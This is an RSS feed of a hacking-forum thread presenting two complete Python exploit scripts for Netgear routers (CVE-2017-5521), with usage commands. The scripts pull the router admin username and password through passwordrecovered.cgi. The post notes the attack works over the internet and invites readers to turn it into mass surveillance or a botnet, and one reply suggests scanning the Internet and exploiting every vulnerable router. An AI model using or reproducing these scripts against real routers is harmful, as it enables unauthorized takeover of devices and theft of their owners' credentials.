<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Using the Netgear Router Exploit CVE-2017-5521</title>
    <link>https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510</link>
    <description>## Introduction
Hello fellow h4x0rz! I&#39;m sure you&#39;ve all heard about the recent Netgear router exploit, correct?!
Well, on this fine day I now present to you this article of Netgear administrator credential finding, using the [CVE-2017-5521](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5521) vulnerability.

(**DISCLAIMER**: _I am offering this article as purely POC and an instrument of learning. What you do with it and what happens as a result IS NOT MY FAULT_)
_____________________
## _NOTES:_

_1. This will only work with routers that have remote administration enabled without password recovery (both are disabled by default)_

_2. It is possible to do this over WAN, considering that the remote admin is internet facing._

_3. This shouldn&#39;t have to be stated, but I know someone will ask; This exploit is ONLY FOR NETGEAR ROUTERS. (As far as we know)_
_______________________

To begin with, we obtain the code from [here.](https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2017-003/?fid=8911)
[code]
## netgore.py
import sys
import requests


def scrape(text, start_trig, end_trig):
    if text.find(start_trig) != -1:
	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
    else:
        return &quot;i_dont_speak_english&quot;
#disable nasty insecure ssl warning
requests.packages.urllib3.disable_warnings()
#1st stage - get token
ip = sys.argv[1]
port = sys.argv[2]
url = &#39;http://&#39; + ip + &#39;:&#39; + port + &#39;/&#39;
try:
	r = requests.get(url)
except:
	url = &#39;https://&#39; + ip + &#39;:&#39; + port + &#39;/&#39;
	r = requests.get(url, verify=False)
model = r.headers.get(&#39;WWW-Authenticate&#39;)
if model is not None:
	print &quot;Attacking: &quot; + model[13:-1]
else:
	print &quot;not a netgear router&quot;
	sys.exit(0)
token = scrape(r.text, &#39;unauth.cgi?id=&#39;, &#39;\&quot;&#39;)
if token == &#39;i_dont_speak_english&#39;:
	print &quot;not vulnerable&quot;
	sys.exit(0)
print &quot;token found: &quot; + token
#2nd stage - pass the token - get the password
url = url + &#39;passwordrecovered.cgi?id=&#39; + token
r = requests.post(url, verify=False)
#profit
if r.text.find(&#39;left\&quot;&gt;&#39;) != -1:
	username = (repr(scrape(r.text, &#39;Router Admin Username&lt;/td&gt;&#39;, &#39;&lt;/td&gt;&#39;)))
	username = scrape(username, &#39;&gt;&#39;, &#39;\&#39;&#39;)
	password = (repr(scrape(r.text, &#39;Router Admin Password&lt;/td&gt;&#39;, &#39;&lt;/td&gt;&#39;)))
	password = scrape(password, &#39;&gt;&#39;, &#39;\&#39;&#39;)
	if username == &quot;i_dont_speak_english&quot;:
		username = (scrape(r.text[r.text.find(&#39;left\&quot;&gt;&#39;):-1], &#39;left\&quot;&gt;&#39;, &#39;&lt;/td&gt;&#39;))
		password = (scrape(r.text[r.text.rfind(&#39;left\&quot;&gt;&#39;):-1], &#39;left\&quot;&gt;&#39;, &#39;&lt;/td&gt;&#39;))
else:
	print &quot;not vulnerable becuse password recovery IS set&quot;
	sys.exit(0)
#html encoding pops out of nowhere, lets replace that
password = password.replace(&quot;&amp;#35;&quot;,&quot;#&quot;)
password = password.replace(&quot;&amp;#38;&quot;,&quot;&amp;&quot;)
print &quot;user: &quot; + username
print &quot;pass: &quot; + password
[/code]

_(We&#39;ll call this netgoreV1)_


[code]
## netgore2.py
import sys
import requests

def scrape(text, start_trig, end_trig):
    if text.find(start_trig) != -1:
	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
    else:
        return &quot;i_dont_speak_english&quot;
#disable nasty insecure ssl warning
requests.packages.urllib3.disable_warnings()
#1st stage
ip = sys.argv[1]
port = sys.argv[2]
url = &#39;http://&#39; + ip + &#39;:&#39; + port + &#39;/&#39;
try:
	r = requests.get(url)
except:
	url = &#39;https://&#39; + ip + &#39;:&#39; + port + &#39;/&#39;
	r = requests.get(url, verify=False)
model = r.headers.get(&#39;WWW-Authenticate&#39;)
if model is not None:
	print &quot;Attacking: &quot; + model[13:-1]
else:
	print &quot;not a netgear router&quot;
	sys.exit(0)
#2nd stage
url = url + &#39;passwordrecovered.cgi?id=get_rekt&#39;
try:
	r = requests.post(url, verify=False)
except:
	print &quot;not vulnerable router&quot;
	sys.exit(0)
#profit
if r.text.find(&#39;left\&quot;&gt;&#39;) != -1:
	username = (repr(scrape(r.text, &#39;Router Admin Username&lt;/td&gt;&#39;, &#39;&lt;/td&gt;&#39;)))
	username = scrape(username, &#39;&gt;&#39;, &#39;\&#39;&#39;)
	password = (repr(scrape(r.text, &#39;Router Admin Password&lt;/td&gt;&#39;, &#39;&lt;/td&gt;&#39;)))
	password = scrape(password, &#39;&gt;&#39;, &#39;\&#39;&#39;)
	if username == &quot;i_dont_speak_english&quot;:
		username = (scrape(r.text[r.text.find(&#39;left\&quot;&gt;&#39;):-1], &#39;left\&quot;&gt;&#39;, &#39;&lt;/td&gt;&#39;))
		password = (scrape(r.text[r.text.rfind(&#39;left\&quot;&gt;&#39;):-1], &#39;left\&quot;&gt;&#39;, &#39;&lt;/td&gt;&#39;))
else:
	print &quot;not vulnerable router, or some one else already accessed passwordrecovered.cgi, reboot router and test again&quot;
	sys.exit(0)
#html encoding pops out of nowhere, lets replace that
password = password.replace(&quot;&amp;#35;&quot;,&quot;#&quot;)
password = password.replace(&quot;&amp;#38;&quot;,&quot;&amp;&quot;)
print &quot;user: &quot; + username
print &quot;pass: &quot; + password
[/code]

_(We&#39;ll call this netgoreV2)_


Now, let&#39;s break these two scripts down a bit.
Both scripts are quite similar in the sense that they check for and grab the model of the Netgear router eventually returning the administrator credentials or if the router isn&#39;t vulnerable, it will state as such.

**_NetgoreV1:_** 
Sends two requests to the router you are attacking. The first request grabs the token, while the second request grabs the credentials. This version is able to grab the creds even if someone has already accessed passwordrecovered.cgi.

**_NetgoreV2:_** 
Sends only one request to your target. (Un)fortunately, many Netgear routers&#39; token mechanism does not work correctly on the first request to passwordrecovered.cgi. The token is not properly checked, allowing the use of ANY token. So what that means is: you can use a 133t h4x0r token like the default get_rekd or fkn_pwned.

In order to use these scripts, you will need to have python installed.

**Usage:**
[code]python netgoreV# [ip] [port] [/code]
**Example:**
[code]python netgoreV2 192.168.0.2 8443 [/code]

To my knowledge, the default LAN IP and Port are as stated above in the usage example.

----------

Now, that&#39;s all for tonight and I wish to leave you a couple of things to think on.

1. Earlier I mentioned that it is possible to exploit this over WAN. Can you think of any ways to turn this into a mass surveilance project, or even a botnet? If so, do feel free to post it in the comments or pm me your thoughts!

2. How can you use this information to protect yourself from exploits like this in the future? You don&#39;t need to extend on this in the comments, but if you feel the need to, don&#39;t stop yourself!

EDIT:
Fixed typo. &quot;Attcking&quot; changed to &quot;Attacking&quot; in both scripts.</description>
    
    <lastBuildDate>Mon, 13 Mar 2017 11:56:04 +0000</lastBuildDate>
    <category>Networking</category>
    <atom:link href="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Using the Netgear Router Exploit CVE-2017-5521</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/9</link>
        <pubDate>Sun, 21 Jan 2018 00:38:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1510-9</guid>
        <source url="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510.rss">Using the Netgear Router Exploit CVE-2017-5521</source>
      </item>
      <item>
        <title>Using the Netgear Router Exploit CVE-2017-5521</title>
        <dc:creator><![CDATA[Neo]]></dc:creator>
        <description><![CDATA[
            <p>The idea of using vulnerabilities to protect machines is really tempting. I had a similar idea about re-purposing Mirai once.</p>
          <p><a href="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/8</link>
        <pubDate>Mon, 13 Mar 2017 11:56:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1510-8</guid>
        <source url="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510.rss">Using the Netgear Router Exploit CVE-2017-5521</source>
      </item>
      <item>
        <title>Using the Netgear Router Exploit CVE-2017-5521</title>
        <dc:creator><![CDATA[Derfloink]]></dc:creator>
        <description><![CDATA[
            <p>It’s good that we haven’t got a netgear aswell I didn’t change this settings <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue_winking_eye.png?v=9" title=":stuck_out_tongue_winking_eye:" class="emoji" alt=":stuck_out_tongue_winking_eye:"></p>
          <p><a href="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/7</link>
        <pubDate>Sat, 11 Mar 2017 13:52:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1510-7</guid>
        <source url="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510.rss">Using the Netgear Router Exploit CVE-2017-5521</source>
      </item>
      <item>
        <title>Using the Netgear Router Exploit CVE-2017-5521</title>
        <dc:creator><![CDATA[VVid0w]]></dc:creator>
        <description><![CDATA[
            <p>Do elaborate on it, because it worked just fine for me.</p>
<p>EDIT:<br>
Oh rofl never mind I see it. Hahaha. “Attcking” . Editing it to fix the typo.</p>
          <p><a href="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/5</link>
        <pubDate>Thu, 02 Feb 2017 13:12:40 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1510-5</guid>
        <source url="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510.rss">Using the Netgear Router Exploit CVE-2017-5521</source>
      </item>
      <item>
        <title>Using the Netgear Router Exploit CVE-2017-5521</title>
        <dc:creator><![CDATA[Joe_Schmoe]]></dc:creator>
        <description><![CDATA[
            <p>There’s a typo in both scripts, on the line which prints what model they are attacking. Literally unusable.</p>
          <p><a href="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/3</link>
        <pubDate>Thu, 02 Feb 2017 09:13:50 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1510-3</guid>
        <source url="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510.rss">Using the Netgear Router Exploit CVE-2017-5521</source>
      </item>
      <item>
        <title>Using the Netgear Router Exploit CVE-2017-5521</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I wonder if we could write a script to scan the Internet for vulnerable netgear routers,  and then exploit them all. And then we can patch the vulnerability once we have root.</p>
          <p><a href="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/2</link>
        <pubDate>Thu, 02 Feb 2017 09:05:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1510-2</guid>
        <source url="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510.rss">Using the Netgear Router Exploit CVE-2017-5521</source>
      </item>
      <item>
        <title>Using the Netgear Router Exploit CVE-2017-5521</title>
        <dc:creator><![CDATA[VVid0w]]></dc:creator>
        <description><![CDATA[
            <h2>Introduction</h2>
<p>Hello fellow h4x0rz! I’m sure you’ve all heard about the recent Netgear router exploit, correct?!<br>
Well, on this fine day I now present to you this article of Netgear administrator credential finding, using the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5521" rel="nofollow noopener">CVE-2017-5521</a> vulnerability.</p>
<p>(<strong>DISCLAIMER</strong>: <em>I am offering this article as purely POC and an instrument of learning. What you do with it and what happens as a result IS NOT MY FAULT</em>)</p>
<hr>
<h2><em>NOTES:</em></h2>
<p><em>1. This will only work with routers that have remote administration enabled without password recovery (both are disabled by default)</em></p>
<p><em>2. It is possible to do this over WAN, considering that the remote admin is internet facing.</em></p>
<p><em>3. This shouldn’t have to be stated, but I know someone will ask; This exploit is ONLY FOR NETGEAR ROUTERS. (As far as we know)</em></p>
<hr>
<p>To begin with, we obtain the code from <a href="https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2017-003/?fid=8911" rel="nofollow noopener">here.</a></p>
<pre><code class="lang-auto">## netgore.py
import sys
import requests


def scrape(text, start_trig, end_trig):
    if text.find(start_trig) != -1:
	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
    else:
        return "i_dont_speak_english"
#disable nasty insecure ssl warning
requests.packages.urllib3.disable_warnings()
#1st stage - get token
ip = sys.argv[1]
port = sys.argv[2]
url = 'http://' + ip + ':' + port + '/'
try:
	r = requests.get(url)
except:
	url = 'https://' + ip + ':' + port + '/'
	r = requests.get(url, verify=False)
model = r.headers.get('WWW-Authenticate')
if model is not None:
	print "Attacking: " + model[13:-1]
else:
	print "not a netgear router"
	sys.exit(0)
token = scrape(r.text, 'unauth.cgi?id=', '\"')
if token == 'i_dont_speak_english':
	print "not vulnerable"
	sys.exit(0)
print "token found: " + token
#2nd stage - pass the token - get the password
url = url + 'passwordrecovered.cgi?id=' + token
r = requests.post(url, verify=False)
#profit
if r.text.find('left\"&gt;') != -1:
	username = (repr(scrape(r.text, 'Router Admin Username&lt;/td&gt;', '&lt;/td&gt;')))
	username = scrape(username, '&gt;', '\'')
	password = (repr(scrape(r.text, 'Router Admin Password&lt;/td&gt;', '&lt;/td&gt;')))
	password = scrape(password, '&gt;', '\'')
	if username == "i_dont_speak_english":
		username = (scrape(r.text[r.text.find('left\"&gt;'):-1], 'left\"&gt;', '&lt;/td&gt;'))
		password = (scrape(r.text[r.text.rfind('left\"&gt;'):-1], 'left\"&gt;', '&lt;/td&gt;'))
else:
	print "not vulnerable becuse password recovery IS set"
	sys.exit(0)
#html encoding pops out of nowhere, lets replace that
password = password.replace("&amp;#35;","#")
password = password.replace("&amp;#38;","&amp;")
print "user: " + username
print "pass: " + password</code></pre>
<p><em>(We’ll call this netgoreV1)</em></p>
<pre><code class="lang-auto">## netgore2.py
import sys
import requests

def scrape(text, start_trig, end_trig):
    if text.find(start_trig) != -1:
	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
    else:
        return "i_dont_speak_english"
#disable nasty insecure ssl warning
requests.packages.urllib3.disable_warnings()
#1st stage
ip = sys.argv[1]
port = sys.argv[2]
url = 'http://' + ip + ':' + port + '/'
try:
	r = requests.get(url)
except:
	url = 'https://' + ip + ':' + port + '/'
	r = requests.get(url, verify=False)
model = r.headers.get('WWW-Authenticate')
if model is not None:
	print "Attacking: " + model[13:-1]
else:
	print "not a netgear router"
	sys.exit(0)
#2nd stage
url = url + 'passwordrecovered.cgi?id=get_rekt'
try:
	r = requests.post(url, verify=False)
except:
	print "not vulnerable router"
	sys.exit(0)
#profit
if r.text.find('left\"&gt;') != -1:
	username = (repr(scrape(r.text, 'Router Admin Username&lt;/td&gt;', '&lt;/td&gt;')))
	username = scrape(username, '&gt;', '\'')
	password = (repr(scrape(r.text, 'Router Admin Password&lt;/td&gt;', '&lt;/td&gt;')))
	password = scrape(password, '&gt;', '\'')
	if username == "i_dont_speak_english":
		username = (scrape(r.text[r.text.find('left\"&gt;'):-1], 'left\"&gt;', '&lt;/td&gt;'))
		password = (scrape(r.text[r.text.rfind('left\"&gt;'):-1], 'left\"&gt;', '&lt;/td&gt;'))
else:
	print "not vulnerable router, or some one else already accessed passwordrecovered.cgi, reboot router and test again"
	sys.exit(0)
#html encoding pops out of nowhere, lets replace that
password = password.replace("&amp;#35;","#")
password = password.replace("&amp;#38;","&amp;")
print "user: " + username
print "pass: " + password</code></pre>
<p><em>(We’ll call this netgoreV2)</em></p>
<p>Now, let’s break these two scripts down a bit.<br>
Both scripts are quite similar in the sense that they check for and grab the model of the Netgear router eventually returning the administrator credentials or if the router isn’t vulnerable, it will state as such.</p>
<p><strong><em>NetgoreV1:</em></strong><br>
Sends two requests to the router you are attacking. The first request grabs the token, while the second request grabs the credentials. This version is able to grab the creds even if someone has already accessed passwordrecovered.cgi.</p>
<p><strong><em>NetgoreV2:</em></strong><br>
Sends only one request to your target. (Un)fortunately, many Netgear routers’ token mechanism does not work correctly on the first request to passwordrecovered.cgi. The token is not properly checked, allowing the use of ANY token. So what that means is: you can use a 133t h4x0r token like the default get_rekd or fkn_pwned.</p>
<p>In order to use these scripts, you will need to have python installed.</p>
<p><strong>Usage:</strong></p>
<pre><code class="lang-auto">python netgoreV# [ip] [port] </code></pre>
<p><strong>Example:</strong></p>
<pre><code class="lang-auto">python netgoreV2 192.168.0.2 8443 </code></pre>
<p>To my knowledge, the default LAN IP and Port are as stated above in the usage example.</p>
<hr>
<p>Now, that’s all for tonight and I wish to leave you a couple of things to think on.</p>
<ol>
<li>
<p>Earlier I mentioned that it is possible to exploit this over WAN. Can you think of any ways to turn this into a mass surveilance project, or even a botnet? If so, do feel free to post it in the comments or pm me your thoughts!</p>
</li>
<li>
<p>How can you use this information to protect yourself from exploits like this in the future? You don’t need to extend on this in the comments, but if you feel the need to, don’t stop yourself!</p>
</li>
</ol>
<p>EDIT:<br>
Fixed typo. “Attcking” changed to “Attacking” in both scripts.</p>
          <p><a href="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510/1</link>
        <pubDate>Thu, 02 Feb 2017 06:21:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1510-1</guid>
        <source url="https://0x00sec.org/t/using-the-netgear-router-exploit-cve-2017-5521/1510.rss">Using the Netgear Router Exploit CVE-2017-5521</source>
      </item>
  </channel>
</rss>
